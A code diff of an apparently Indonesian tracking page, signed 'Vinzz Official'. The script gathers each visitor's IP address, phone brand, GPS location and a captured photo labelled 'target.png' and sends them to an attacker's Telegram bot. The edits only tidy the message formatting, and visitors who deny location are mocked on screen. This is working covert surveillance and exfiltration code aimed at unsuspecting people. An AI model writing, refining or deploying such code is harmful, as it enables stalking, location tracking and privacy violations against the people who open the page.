@@ -17,7 +17,7 @@ const ua = navigator.userAgent;
 if (/Samsung/i.test(ua)) return "Samsung";  
 if (/Xiaomi|Mi/i.test(ua)) return "Xiaomi";  
 if (/Redmi/i.test(ua)) return "Redmi";  
-if (/CPH/i.test(ua)) return "Oppo";  
+if (/OPPO/i.test(ua)) return "Oppo";  
 if (/Vivo/i.test(ua)) return "Vivo";  
 if (/Realme/i.test(ua)) return "Realme";  
 if (/iPhone/i.test(ua)) return "iPhone";  
@@ -57,7 +57,7 @@ async function kirimFoto() {
         const formData = new FormData();
         formData.append("chat_id", chat_id);
         formData.append("photo", blob, "target.png");
-        formData.append('caption', '📸 ini fotonya tuan vinzz');
+        formData.append('caption', 'ini fotonya tuan vinzz');
 
         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
@@ -87,11 +87,7 @@ text: pesan
 (async () => {
 const ip = await getIP();
 const merek = getMerekHP();
-const pesanAwal = `╭──「 IP berhasil ditemukan! 」──
-│🌐 Status: MENUNGGU IZIN LOKASI
-│📡 IP: ${ip}
-│📱 Merek hp: ${merek}
-╰───────────────────`;
+const pesanAwal = `IP berhasil ditemukan!\nStatus: MENUNGGU IZIN LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
 await kirimPesanTelegram(pesanAwal);
 })();
 
@@ -104,12 +100,7 @@ navigator.geolocation.getCurrentPosition(
     const merek = getMerekHP();
 
     // Menambahkan link peta di pesan jika lokasi diizinkan
-    const pesan = `╭──「 IP berhasil ditemukan! 」──
-│🌐 Status: MENGIZINKAN LOKASI
-│📡 IP: ${ip}
-│📱 Merek hp: ${merek}
-│📍 Lokasi: ${gmaps}
-╰───────────────────`;
+    const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\nMerek hp: ${merek}\nLokasi: ${gmaps}`;
     await kirimPesanTelegram(pesan);
 
     kirimFoto()
@@ -120,11 +111,7 @@ navigator.geolocation.getCurrentPosition(
     const ip = await getIP();
     const merek = getMerekHP();
 
-    const pesan = `╭──「 IP berhasil ditemukan! 」──
-│🌐 Status: MENOLAK LOKASI
-│📡 IP: ${ip}
-│📱 Merek hp: ${merek}
-╰───────────────────`;
+    const pesan = `IP berhasil ditemukan!\nStatus: MENOLAK LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
     await kirimPesanTelegram(pesan);
 
     document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
